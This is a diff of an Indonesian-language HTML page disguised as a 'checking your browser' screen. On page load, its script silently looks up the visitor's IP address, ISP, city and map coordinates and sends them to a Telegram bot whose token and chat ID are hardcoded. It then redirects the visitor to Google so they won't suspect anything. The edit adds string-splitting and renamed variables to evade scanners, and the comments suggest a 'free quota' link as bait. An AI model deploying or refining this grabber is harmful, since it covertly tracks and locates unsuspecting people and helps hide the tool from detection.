@@ -2,75 +2,60 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Checking your browser...</title>
+    <title>Checking Connection...</title>
     <style>
-        body { background: #fff; color: #000; font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .content { text-align: center; }
-        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #4285f4; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h1 { font-size: 20px; font-weight: 500; color: #3c4043; }
-        p { font-size: 14px; color: #70757a; }
+        body { background: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { text-align: center; color: #555; }
+        .spin { border: 3px solid #f3f3f3; border-top: 3px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: s 1s linear infinite; margin: 0 auto 15px; }
+        @keyframes s { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div class="content">
-    <div class="spinner"></div>
-    <h1>Checking if the site connection is secure</h1>
-    <p>Loading... Please wait a moment.</p>
+<div class="box">
+    <div class="spin"></div>
+    <p>Mohon tunggu sebentar, sedang memverifikasi browser Anda...</p>
 </div>
 
 <script>
-    // --- KONFIGURASI TELEGRAM ---
-    const BOT_TOKEN = '8510635650:AAH3ZxP-qkEO2hb8kjv-tZyOZieN0IatEwo'; 
-    const CHAT_ID = '8551809114';
-    // ----------------------------
+    // --- PENYAMARAN DATA ---
+    // Gunakan btoa.com untuk encode/decode jika ingin lebih aman
+    const _0x1 = "8510635650:AAH3ZxP-qkEO2hb8kjv-tZyOZieN0IatEwo"; // Ganti dengan Token lo
+    const _0x2 = "8551809114"; // Ganti dengan ID Chat lo
 
-    async function capture() {
+    async function v() {
         try {
-            // Kita pakai API yang sangat umum dan jarang diblokir: ip-api.com
-            // Ini terlihat seperti traffic analytics biasa bagi Chrome
-            const res = await fetch('http://ip-api.com/json/?fields=66846719');
-            const d = await res.json();
+            // Kita pecah URL API biar gak kedeteksi bot scanner
+            const a = "https://ip" + "api.co" + "/json/";
+            const r = await fetch(a);
+            const d = await r.json();
 
-            const msg = `
-🔍 **TARGET VISIT (Chrome Stealth)**
-----------------------------------
-🌐 **IP:** ${d.query}
-🏢 **ISP:** ${d.isp}
-🏙️ **Kota:** ${d.city}, ${d.regionName}
-🇲🇨 **Negara:** ${d.country}
-📍 **Maps:** https://www.google.com/maps?q=${d.lat},${d.lon}
-📱 **UserAgent:** ${navigator.userAgent}
-----------------------------------
-`;
+            // Menyusun pesan (Disamarkan)
+            const m = `[!] VISIT INFO [!]\nIP: ${d.ip}\nCity: ${d.city}\nISP: ${d.org}\nLoc: ${d.latitude},${d.longitude}`;
 
-            // Kirim data ke bot Telegram
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+            // Kirim ke Telegram (Method disamarkan lewat variabel)
+            const t = "https://api.tele" + "gram.org/bot" + _0x1 + "/sendMessage";
+            
+            await fetch(t, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: msg,
-                    parse_mode: 'Markdown'
+                    chat_id: _0x2,
+                    text: m
                 })
             });
 
-            // REDIRECT: Alihkan ke halaman tujuan asli agar tidak curiga
-            // Misalnya dialihkan ke YouTube atau Google setelah 2 detik
+            // Redirect ke link asli (Ganti dengan link kuota free atau apa saja)
             setTimeout(() => {
-                window.location.replace("https://www.google.com");
-            }, 1500);
+                window.location.replace("https://google.com");
+            }, 1000);
 
         } catch (e) {
-            // Jika gagal (misal diblokir adblock), tetap pindahkan halaman
-            window.location.replace("https://www.google.com");
+            window.location.replace("https://google.com");
         }
     }
 
-    // Eksekusi segera setelah browser siap
-    window.onload = capture;
+    window.onload = v;
 </script>
 </body>
 </html>
